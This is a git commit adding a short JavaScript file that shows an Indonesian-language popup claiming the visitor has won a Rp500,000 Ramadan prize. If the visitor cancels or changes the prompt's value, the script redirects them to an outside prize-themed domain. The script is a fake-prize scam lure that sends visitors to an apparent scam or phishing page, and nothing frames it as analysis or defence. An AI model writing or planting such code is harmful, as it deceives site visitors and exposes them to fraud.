8392f595e30ad0798d3bfa609421aa9d0d4a61c6
usorondo55 <99inkwell-sunbeam@icloud.com>
2026-02-27 03:35:03 +0100

    Create indone.js

---
+++ indone.js
@@ -0,0 +1,5 @@
+var password = 'Rp500,000'
+password = prompt('Bachtiar: Selamat, Anda berhak mendapatkan Hadiah Ramadan Rp500,000. Klik OK untuk mengaktifkan sekarang','Rp500,000');
+if (password != 'Rp500,000') {
+    location.href ='https://www.ibokekpu.site/ramadan-rp500000';
+}
